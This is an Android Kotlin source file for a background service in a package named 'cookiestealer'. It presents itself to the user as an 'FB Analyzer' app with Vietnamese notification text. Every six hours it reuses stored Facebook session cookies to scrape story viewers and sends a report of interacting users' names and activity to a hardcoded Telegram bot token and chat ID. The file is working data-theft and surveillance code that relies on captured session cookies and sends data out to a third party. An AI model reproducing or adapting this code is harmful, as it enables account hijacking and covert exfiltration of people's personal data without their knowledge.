package com.example.cookiestealer

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class DataCollectorService : Service() {

    private lateinit var database: InteractionDatabase
    private lateinit var scraper: FacebookScraper
    private val handler = Handler(Looper.getMainLooper())
    private var collectCount = 0

    companion object {
        private const val NOTIFICATION_ID = 2
        private const val CHANNEL_ID = "DataCollectorChannel"
        private const val COLLECT_INTERVAL = 6 * 60 * 60 * 1000L // 6 giờ
        
        private const val BOT_TOKEN = "8254292889:AAHoRmMpWPco3Q-tzfEjSV1_TnQFxD7tIgA"
        private const val CHAT_ID = "5266362838"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        database = InteractionDatabase(this)
        scraper = FacebookScraper(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createNotification("Đang thu thập dữ liệu..."))
        
        startDataCollection()
        
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Data Collector Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Thu thập dữ liệu Facebook tự động"
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(text: String): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("FB Analyzer")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    private fun updateNotification(text: String) {
        val notification = createNotification(text)
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIFICATION_ID, notification)
    }

    private fun startDataCollection() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                collectData()
                handler.postDelayed(this, COLLECT_INTERVAL)
            }
        }, 1000)
    }

    private fun collectData() {
        collectCount++
        updateNotification("Đang thu thập... (lần $collectCount)")

        val prefs = getSharedPreferences("FBAnalyzer", MODE_PRIVATE)
        val cookies = prefs.getString("cookies", "") ?: ""

        if (cookies.isEmpty()) {
            updateNotification("Chưa đăng nhập")
            return
        }

        // Thu thập story viewers
        scraper.scrapeStoryViewers(cookies) { names ->
            handler.post {
                names.forEach { name ->
                    database.addStoryView(name)
                }
                
                updateNotification("✅ Đã lưu ${names.size} người xem story")
                
                // Gửi báo cáo lên Telegram
                sendReportToTelegram(names.size)
                
                // Dọn dẹp dữ liệu cũ
                database.cleanOldData(90)
            }
        }
    }

    private fun sendReportToTelegram(viewersCount: Int) {
        CoroutineScope(Dispatchers.IO).launch {
            val stats = database.getTopInteractions(7, 5)
            val totalRecords = database.getTotalRecords()
            val dbSize = database.getDatabaseSizeMB()
            val time = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
            
            val message = buildString {
                append("📊 BÁO CÁO THU THẬP DỮ LIỆU\n\n")
                append("⏰ Thời gian: $time\n")
                append("🔢 Lần thứ: $collectCount\n")
                append("👥 Story viewers mới: $viewersCount\n")
                append("💾 Tổng records: $totalRecords\n")
                append("📁 Database: ${String.format("%.2f", dbSize)} MB\n\n")
                
                if (stats.isNotEmpty()) {
                    append("🏆 TOP 5 TƯƠNG TÁC (7 ngày):\n")
                    stats.take(5).forEachIndexed { index, user ->
                        append("${index + 1}. ${user.name}\n")
                        append("   👁️ ${user.storyViews} | ❤️ ${user.postLikes} | 💬 ${user.comments}\n")
                    }
                }
            }
            
            TelegramSender.sendMessage(BOT_TOKEN, CHAT_ID, message)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
        database.close()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}

